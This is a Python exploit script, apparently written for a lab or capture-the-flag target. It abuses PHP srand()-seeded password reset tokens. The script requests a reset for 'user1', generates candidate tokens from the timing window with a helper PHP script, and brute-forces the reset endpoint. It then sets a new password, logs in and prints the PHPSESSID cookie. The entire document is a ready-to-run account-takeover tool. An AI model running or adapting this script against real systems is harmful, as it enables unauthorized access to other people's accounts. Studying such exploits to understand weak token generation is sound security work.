#!/usr/bin/env python3

import requests 
import traceback
import argparse
from urllib.parse import urljoin
from time import time
import subprocess

def tokenSpray(target):
    """
    Request password reset token for user `user1`
    """
    passRstUrl = urljoin(target, "/forgotpassword.php")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    passRstData = {"username": "user1"}

    try:
        epoch_time_milis_start = int(time() * 1000)
        passRstRes = requests.post(passRstUrl, headers=headers, data=passRstData)
        epoch_time_milis_end = int(time() * 1000)

        if "Email sent!" not in passRstRes.text:
            print("[-] Failed to request the password reset token")
            return

        print("[+] Password reset token requested successfully")
        print(f"[*] Password reset token time interval: {epoch_time_milis_start} ... {epoch_time_milis_end}")
        # --- Generate password reset token list ---
        try:
            GenTknLstCommand = f"php genTokenList.php {epoch_time_milis_start} {epoch_time_milis_end}"
            print(f"[*] Executing: {GenTknLstCommand}")
            result = subprocess.run(GenTknLstCommand, shell=True, check=True, capture_output=True, text=True)
            print(result.stdout.strip())

        except FileNotFoundError as e:
            print("[-] genTokenList.php file not found:", e)
            return
        except subprocess.CalledProcessError as e:
            print("[-] Command failed with return code:", e.returncode)
            if e.stderr:
                print("[-] Error output:", e.stderr)
            return
        except Exception as e:
            print("[-] Unexpected error during token list generation:", e)
            traceback.print_exc()
            return

        # --- Bruteforce the correct password reset token ---
        print("[*] Starting token spray attack. Standby")
        token_count = 0
        try:
            with open("tokens.txt", "r") as file:
                for token in file:
                    token = token.rstrip()
                    token_count += 1
                    if token_count % 100 == 0:
                        print(f"[*] Tested {token_count} tokens...")

                    PassRstCfrmUrl = urljoin(target, "/resetpassword.php")
                    newPassword = "Password!1234"
                    PassRstCfrmData = {"token": token, "password1": newPassword, "password2": newPassword}

                    try:
                        PassRstCfrmRes = requests.post(PassRstCfrmUrl, headers=headers, data=PassRstCfrmData, allow_redirects=False)
                        if "Token is invalid." not in PassRstCfrmRes.text and "Password changed!" in PassRstCfrmRes.text:
                            print("[+] Valid password reset token:", token)
                            print(f"[+] Password for user `user1` was changed successfully. New password: {newPassword}")
                            """
                            Login
                            """
                            lgnUrl = urljoin(target, "/login.php")
                            lgnData = {"username": "user1", "password": f"{newPassword}"}
                            lgnRes = requests.post(lgnUrl, headers=headers, data=lgnData, allow_redirects=False)
                            if 'PHPSESSID' in lgnRes.cookies and lgnRes.status_code==302:
                                PHPSESSID_value = lgnRes.cookies['PHPSESSID']
                                print("[+] Logged in successfully")
                                print(f"[+] Cookie: PHPSESSID={PHPSESSID_value}")
                                return PHPSESSID_value
                            else:
                                print("[-] Could not extract PHPSESSID from cookies")
                                return None

                    except Exception as e:
                        print(f"[-] Error testing token {token}: {e}")

            print(f"[-] No valid token found after testing {token_count} tokens")

        except FileNotFoundError:
            print("[-] tokens.txt file not found")
        except Exception as e:
            print("[-] Unexpected error during token spraying:", e)
            traceback.print_exc()

    except Exception as e:
        print("[-] Error sending the password reset request:", e)
        traceback.print_exc()

def main():
    parser = argparse.ArgumentParser(description="Exploit the PHP `srand()` insecure random number generator to brute-force the password reset token and change the account's password")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    args = parser.parse_args()

    tokenSpray(args.target)

if __name__ == "__main__":
    main()
